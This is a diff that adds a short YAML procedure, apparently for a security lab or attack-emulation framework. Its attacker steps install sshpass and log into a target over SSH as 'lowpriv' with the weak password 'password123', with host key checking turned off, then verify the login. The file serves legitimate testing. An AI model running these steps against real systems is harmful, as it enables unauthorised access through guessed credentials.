@@ -1,0 +1,31 @@
+procedure:
+- action:
+    command: which sshpass || apt-get install -y sshpass
+    type: exec_attacker
+  expect:
+    exit_code: 0
+  outputs: {}
+  session: null
+  step_id: install_sshpass
+  timeout: 30
+- action:
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      lowpriv@${target_host} 'id && whoami'
+    type: exec_attacker
+  expect:
+    stdout_contains: uid=1000(lowpriv)
+  outputs: {}
+  session: null
+  step_id: exploit_weak_credentials
+  timeout: 30
+- action:
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      lowpriv@${target_host} 'id'
+    type: exec_attacker
+  expect:
+    stdout_regex: uid=1000\(lowpriv\) gid=1000\(lowpriv\) groups=1000\(lowpriv\)
+  outputs: {}
+  session: null
+  step_id: verify_success
+  timeout: 30
+sessions: []
